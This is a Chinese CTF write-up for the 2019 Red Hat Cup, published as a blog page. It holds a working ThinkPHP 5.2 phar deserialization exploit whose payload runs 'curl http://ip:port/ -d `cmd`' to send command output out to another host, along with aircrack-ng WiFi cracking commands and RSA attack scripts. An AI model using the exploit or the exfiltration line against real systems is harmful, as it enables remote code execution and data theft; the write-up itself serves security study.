@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言打完湖湘杯紧接着就是红帽杯，两场比赛形成鲜明对比，吹一波pwn爷爷牛逼！ WebTicket_System通过js可以找到postXML接口">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019红帽杯">
+<meta property="og:url" content="http://yoursite.com/2019/11/10/2019红帽杯/index.html">
+<meta property="og:site_name" content="Glarcy">
+<meta property="og:description" content="前言打完湖湘杯紧接着就是红帽杯，两场比赛形成鲜明对比，吹一波pwn爷爷牛逼！ WebTicket_System通过js可以找到postXML接口">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/img/redhat/14.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/15.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/20.jpg">
+<meta property="og:image" content="http://yoursite.com/img/redhat/16.jpg">
+<meta property="og:image" content="http://yoursite.com/img/redhat/17.jpg">
+<meta property="og:image" content="http://yoursite.com/img/redhat/18.jpg">
+<meta property="og:image" content="http://yoursite.com/img/redhat/19.jpg">
+<meta property="og:image" content="http://yoursite.com/img/redhat/1.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/4.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/2.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/3.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/5.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/6.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/7.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/8.png">
+<meta property="og:image" content="http://yoursite.com/img/redhat/9.jpg">
+<meta property="og:image" content="http://yoursite.com/img/redhat/10.jpg">
+<meta property="og:image" content="http://yoursite.com/img/redhat/11.jpg">
+<meta property="og:image" content="http://yoursite.com/img/redhat/12.jpg">
+<meta property="og:image" content="http://yoursite.com/img/redhat/13.jpg">
+<meta property="og:updated_time" content="2022-04-10T09:50:41.725Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019红帽杯">
+<meta name="twitter:description" content="前言打完湖湘杯紧接着就是红帽杯，两场比赛形成鲜明对比，吹一波pwn爷爷牛逼！ WebTicket_System通过js可以找到postXML接口">
+<meta name="twitter:image" content="http://yoursite.com/img/redhat/14.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/10/2019红帽杯/">
+
+
+
+
+
+  <title>2019红帽杯 | Glarcy</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Glarcy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/10/2019红帽杯/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Glarcy">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glarcy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019红帽杯</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-10T16:16:52+08:00">
+                2019-11-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>打完湖湘杯紧接着就是红帽杯，两场比赛形成鲜明对比，吹一波pwn爷爷牛逼！</p>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Ticket-System"><a href="#Ticket-System" class="headerlink" title="Ticket_System"></a>Ticket_System</h4><p>通过js可以找到postXML接口</p>
+<p><img src="../../../../img/redhat/14.png" alt="14"></p>
+<a id="more"></a>
+
+<p>XXE漏洞存在，读取根目录下的hints.txt得知需要实现rce</p>
+<p><img src="../../../../img/redhat/15.png" alt="15"></p>
+<p>从报错页面得知thinkphp的版本为5.2.0，查到tp5.2的RCE pop链并利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($files)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($files);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = <span class="title">array</span>("<span class="title">Smi1e</span>" =&gt; "1");</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">trait</span> Attribute</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> $data;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = <span class="keyword">array</span>(<span class="string">"Smi1e"</span> =&gt; <span class="string">"system"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($system)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">"Smi1e"</span> =&gt; <span class="string">"$system"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($system)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get($system);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Conver</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>("<span class="title">ls</span>");</span><br><span class="line">    $Conver= <span class="keyword">new</span> think\model\Pivot(<span class="string">"curl http://ip:port/ -d `cmd`;"</span>);</span><br><span class="line">    $payload = <span class="keyword">new</span> think\process\pipes\Windows($Conver);</span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($payload); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过ls打回发现根目录有flag和readflag，flag无法直接读，而拿下readflag放入ida发现需要提交问题答案才能得到flag，这里想到了*CTF的mywebsql，于是将那题的脚本写入上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// 标准输入，子进程从此管道中读取数据</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// 标准输出，子进程向此管道中写入数据</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"file"</span>, <span class="string">"/tmp/error-output.txt"</span>, <span class="string">"a"</span>) <span class="comment">// 标准错误，写入到一个文件</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open(<span class="string">'/readflag'</span>, $descriptorspec, $pipes, $cwd, $env);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_resource($process)) &#123;</span><br><span class="line">    $question = fread($pipes[<span class="number">1</span>],<span class="number">1024</span>); <span class="comment">// 获取程序问题</span></span><br><span class="line">    $question = fread($pipes[<span class="number">1</span>],<span class="number">1024</span>); <span class="comment">// 获取程序问题</span></span><br><span class="line">    $question = trim($question);</span><br><span class="line">    var_dump($question);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'$result = '</span>.$question.<span class="string">';'</span>);   <span class="comment">// 计算问题结果</span></span><br><span class="line">    fwrite($pipes[<span class="number">0</span>], $result);         <span class="comment">// 回答程序问题</span></span><br><span class="line">    fclose($pipes[<span class="number">0</span>]);</span><br><span class="line">    var_dump($result);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// $flag = stream_get_contents($pipes[1]);// getflag</span></span><br><span class="line">    $flag = fread($pipes[<span class="number">1</span>],<span class="number">1024</span>);</span><br><span class="line">    $flag = fread($pipes[<span class="number">1</span>],<span class="number">1024</span>);</span><br><span class="line">    $flag = fread($pipes[<span class="number">1</span>],<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">    fclose($pipes[<span class="number">1</span>]);</span><br><span class="line">    var_dump($flag);</span><br><span class="line"></span><br><span class="line">    $return_value = proc_close($process);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"command returned $return_value\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php /tmp/uploads/4a8a08f09d37b73795649038408b5f33/20191111/a1366473906508668348fdf37c6c6feb.xml</span><br></pre></td></tr></table></figure>
+
+<p>运行flag弹回到端口上</p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h4><p>出题人失误，源文件直接给出了flag</p>
+<h4 id="Related"><a href="#Related" class="headerlink" title="Related"></a>Related</h4><p>由题目已知</p>
+<p><img src="../../../../img/redhat/20.jpg" alt="20"></p>
+<p>由题目名联想到Related Message Attack，比赛的时候弟弟们只找到了这个Orz</p>
+<p><a href="https://github.com/ashutosh1206/Crypton/tree/master/RSA-encryption/Attack-Franklin-Reiter" target="_blank" rel="noopener">https://github.com/ashutosh1206/Crypton/tree/master/RSA-encryption/Attack-Franklin-Reiter</a></p>
+<p>没有找到下面这个paper，从这个paper可以找到一个推广的结论</p>
+<p><a href="https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf" target="_blank" rel="noopener">https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf</a></p>
+<p><img src="../../../../img/redhat/16.jpg" alt="16"></p>
+<p>据此可以构造同余方程组, 利用 Gtoebner Basis 对方程式的变量做线性变换的化解(类似于求代数方程的解) 即可解出初始状态获得 flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">n = <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498205967870181640370981402627360812251649</span></span><br><span class="line">s = <span class="number">280513550110197745829890567436265496990</span></span><br><span class="line">c1 = <span class="number">10607235400098586699994392584841806592000660816191315008947917773605476365884572056544621466807636237415893192966935651590312237598366247520986667580174438232591692369894702423377081613821241343307094343575042030793564118302488401888197517625333923710172738913771484628557310164974384462856047065486913046647133386246976457961265115349103039946802386897315176633274295410371986422039106745216230401123542863714301114753239888820442112538285194875243192862692290859625788686421276234445677411280606266052059579743874849594812733193363406594409214632722438592376518310171297234081555028727538951934761726878443311071990</span></span><br><span class="line">c2 = <span class="number">2665348075952836665455323350891842781938471372943896177948046901127648217780657532963063228780230203325378931053293617434754585479452556620021360669764370971665619743473463613391689402725053682169256850873752706252379747752552015341379702582040497607180172854652311649467878714425698676142212588380080361100526614423533767196749274741380258842904968147508033091819979042560336703564128279527380969385330845759998657540777339113519036552454829323666242269607225156846084705957131127720351868483375138773025602253783595007177712673092409157674720974653789039702431795168654387038080256838321255342848782705785524911705</span></span><br><span class="line">c3 = <span class="number">4881225713895414151830685259288740981424662400248897086365166643853409947818654509692299250960938511400178276416929668757746679501254041354795468626916196040017280791985239849062273782179873724736552198083211250561192059448730545500442981534768431023858984817288359193663144417753847196868565476919041282010484259630583394963580424358743754334956833598351424515229883148081492471874232555456362089023976929766530371320876651940855297249474438564801349160584279330339012464716197806221216765180154233949297999618011342678854874769762792918534509941727751433687189532019000334342211838299512315478903418642056097679717</span></span><br><span class="line"></span><br><span class="line">R.&lt;x, y, z&gt; = Zmod(n)[]</span><br><span class="line">I = ideal(x + y + z - s, x^<span class="number">17</span> - c1, y^<span class="number">17</span> - c2, z^<span class="number">17</span> - c3)</span><br><span class="line">res = I.groebner_basis()</span><br><span class="line"><span class="comment">#print(res)</span></span><br><span class="line">m1 = n - Integer(res[<span class="number">0</span>] - x)</span><br><span class="line">m2 = n - Integer(res[<span class="number">1</span>] - y)</span><br><span class="line">m3 = n - Integer(res[<span class="number">2</span>] - z)</span><br><span class="line">m = (Integer(m3&lt;&lt;<span class="number">256</span>) + Integer(m2&lt;&lt;<span class="number">128</span>) + Integer(m1))</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line">print(binascii.a2b_hex(hex(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/redhat/17.jpg" alt="17"></p>
+<h4 id="精明的Alice"><a href="#精明的Alice" class="headerlink" title="精明的Alice"></a>精明的Alice</h4><p>题目名说是Broadcast，但实际上并不是简单的广播攻击。简单的广播攻击，前提是对同一个m加密，但在这一题里，显然每一次的m都不一样，并且e=3的时候，只有2个明密文对</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">'from'</span>: sha256( <span class="string">b'Alice'</span> ).hexdigest(),</span><br><span class="line">            <span class="string">'to'</span>  : sha256( name.encode() ).hexdigest(),</span><br><span class="line">            <span class="string">'msg'</span> : msg</span><br><span class="line">            &#125;</span><br><span class="line">    data = json.dumps(data, sort_keys=<span class="literal">True</span>)</span><br><span class="line">    m = number.bytes_to_long( data.encode() )</span><br></pre></td></tr></table></figure>
+
+<p>其中只有<code>&#39;to&#39; : name</code>会变，又由于<code>json.dumps(data, sort_keys=True)</code>，data会根据key排序输出，即</p>
+<p><img src="../../../../img/redhat/18.jpg" alt="18"></p>
+<p>可以发现，msg会被排序至中间这个位置。根据题目，我们可以知道每一个<code>m</code>的高、中位都是不变的，只不过低位变了而已，而我们要求的是中间的msg，参考SCTF的babygame</p>
+<p><a href="http://www.soreatu.com/ctf/writeups/Writeup%20for%20babygame%20in%202019%20SCTF.html" target="_blank" rel="noopener">http://www.soreatu.com/ctf/writeups/Writeup%20for%20babygame%20in%202019%20SCTF.html</a></p>
+<p>使用Broadcast Attack with Linear Padding</p>
+<p><a href="https://github.com/ashutosh1206/Crypton/tree/master/RSA-encryption/Attack-Hastad-Broadcast" target="_blank" rel="noopener">https://github.com/ashutosh1206/Crypton/tree/master/RSA-encryption/Attack-Hastad-Broadcast</a></p>
+<p><img src="../../../../img/redhat/19.jpg" alt="19"></p>
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>填问卷拿flag</p>
+<h4 id="Advertising-for-Marriage"><a href="#Advertising-for-Marriage" class="headerlink" title="Advertising for Marriage"></a>Advertising for Marriage</h4><p>查看文件发现vegetable.png，然后dump下来</p>
+<p><img src="../../../../img/redhat/1.png" alt="1"></p>
+<p>但是这个图在kali里打不开，显示crc错误，拖出来爆破得到高度为d3，修改得到原图片</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">img = open(<span class="string">"vegetable.png"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    c = img[<span class="number">12</span>:<span class="number">20</span>]+struct.pack(<span class="string">'&gt;i'</span>,i)+img[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0xb80a1736</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(i)</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/redhat/4.png" alt="4"></p>
+<p>再次查看进程，发现画图进程mspaint.exe</p>
+<p><img src="../../../../img/redhat/2.png" alt="2"></p>
+<p>dump下来经过一番处理得到：b1cx</p>
+<p><img src="../../../../img/redhat/3.png" alt="3"></p>
+<p>查看notepad text</p>
+<p><img src="../../../../img/redhat/5.png" alt="5"></p>
+<p>结合得到b1cxneedmoneyandgirlfirend，使用lsb隐写恢复数据</p>
+<p><img src="../../../../img/redhat/6.png" alt="6"></p>
+<p><img src="../../../../img/redhat/7.png" alt="7"></p>
+<p>base64解密得到Virginia ciphertext:gnxtmwg7r1417psedbs62587h0</p>
+<p>Virginia解密得到flagisd7f1417bfafbf62587e0</p>
+<p><img src="../../../../img/redhat/8.png" alt="8"></p>
+<h4 id="恶臭的数据包"><a href="#恶臭的数据包" class="headerlink" title="恶臭的数据包"></a>恶臭的数据包</h4><p>拿到数据包发现是wifi加密的流量，随便跑个字典拿到密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng cacosmia.cap -w dict.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/redhat/9.jpg" alt="9"></p>
+<p>用essid和密码解密流量包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airdecap-ng cacosmia.cap -e mamawoxiangwantiequan -p 12345678</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/redhat/10.jpg" alt="10"></p>
+<p>打开解密流量包，发现有一张png，并且在末尾发现一个压缩包，里面有flag.txt，但是需要密码</p>
+<p><img src="../../../../img/redhat/11.jpg" alt="11"></p>
+<p>解密jwt，说密码是一个网址</p>
+<p><img src="../../../../img/redhat/12.jpg" alt="12"></p>
+<p>过滤dns，把全部网址试一遍，最后找到这个</p>
+<p><img src="../../../../img/redhat/13.jpg" alt="13"></p>
+<p>解压得到flag{f14376d0-793e-4e20-9eab-af23f3fdc158}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/09/2019湖湘杯/" rel="next" title="2019湖湘杯">
+                <i class="fa fa-chevron-left"></i> 2019湖湘杯
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/10/vue学习记录/" rel="prev" title="vue学习记录">
+                vue学习记录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
